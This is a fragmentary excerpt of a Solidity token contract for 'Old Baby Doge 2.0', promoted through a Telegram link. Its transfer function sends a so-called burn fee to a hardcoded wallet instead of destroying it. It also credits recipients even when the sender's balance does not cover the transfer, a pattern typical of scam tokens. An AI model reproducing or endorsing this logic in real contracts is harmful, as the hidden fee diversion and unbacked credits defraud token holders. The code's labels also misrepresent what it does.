...
// Submitted for Telegram: https://t.me/oldbabydogeOfficial
...
contract  OldBabyDogeTwoZero  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "Old Baby Doge 2.0";
    string private _symbol = "oBabyDoge2.0";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xeD9439750BF2BFEF1B44F8E690273F0bf0A5Eb5b] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0xeD9439750BF2BFEF1B44F8E690273F0bf0A5Eb5b, _bruntoken);
        }
